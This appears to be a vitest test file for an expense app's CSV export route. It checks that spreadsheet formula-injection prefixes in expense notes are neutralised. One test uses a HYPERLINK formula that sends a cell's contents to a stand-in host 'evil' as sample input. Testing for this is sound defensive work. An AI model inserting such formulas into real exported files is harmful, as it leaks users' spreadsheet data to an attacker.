import { describe, it, expect, beforeAll, beforeEach } from "vitest";
import exportRouter from "./export.js";
import { ensureMigrated, resetDb, seedTestUsers, seedTestSession, sessionCookie, insertExpense } from "../test/db.js";
import { mountRouter } from "../test/app.js";

beforeAll(() => ensureMigrated());

let userAId: string;
let userACookie: string;
const app = mountRouter("export", exportRouter);

async function exportCsv(): Promise<string> {
  const res = await app.request("/api/export", { headers: { cookie: userACookie } });
  expect(res.status).toBe(200);
  return res.text();
}

/** Return the data rows (everything after the header line). */
function dataRows(csv: string): string[] {
  return csv.split("\n").slice(1);
}

beforeEach(() => {
  resetDb();
  const users = seedTestUsers();
  userAId = users.userA.id;
  userACookie = sessionCookie(seedTestSession(userAId));
});

describe("GET /api/export — CSV formula injection neutralization", () => {
  it("prefixes a single quote when the note starts with '='", async () => {
    insertExpense({
      user_id: userAId,
      category_id: "cat-food",
      subcategory_id: "sub-groceries",
      amount: 100,
      note: "=1+2",
    });
    const csv = await exportCsv();
    // No CSV special chars → no RFC-4180 quoting, just the sanitizing prefix.
    expect(csv).toContain(",'=1+2,");
    expect(csv).not.toContain(",=1+2,");
  });

  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "neutralizes a leading %j formula prefix",
    async (prefix) => {
      insertExpense({
        user_id: userAId,
        category_id: "cat-food",
        subcategory_id: "sub-groceries",
        amount: 100,
        note: `${prefix}DANGER`,
      });
      const csv = await exportCsv();
      const row = dataRows(csv).find((r) => r.includes("DANGER"))!;
      const cell = row.split(",")[5];
      expect(cell.startsWith("'")).toBe(true);
    },
  );

  it("neutralizes the classic HYPERLINK payload and still RFC-4180 quotes it", async () => {
    insertExpense({
      user_id: userAId,
      category_id: "cat-food",
      subcategory_id: "sub-groceries",
      amount: 100,
      note: '=HYPERLINK("http://evil/?"&A1,"x")',
    });
    const csv = await exportCsv();
    // Contains commas + quotes → must be wrapped and double-quote-escaped, with
    // the sanitizing single-quote sitting *inside* the wrapping quotes.
    expect(csv).toContain('"\'=HYPERLINK(""http://evil/?""&A1,""x"")"');
  });

  it("leaves a safe note untouched", async () => {
    insertExpense({
      user_id: userAId,
      category_id: "cat-food",
      subcategory_id: "sub-groceries",
      amount: 100,
      note: "lunch with team",
    });
    const csv = await exportCsv();
    expect(csv).toContain(",lunch with team,");
  });

  it("does not alter the numeric EUR amount column", async () => {
    insertExpense({
      user_id: userAId,
      category_id: "cat-food",
      subcategory_id: "sub-groceries",
      amount: 3250,
      note: "safe",
    });
    const csv = await exportCsv();
    const row = dataRows(csv).find((r) => r.includes("safe"))!;
    expect(row.split(",")[4]).toBe("32.50");
  });
});
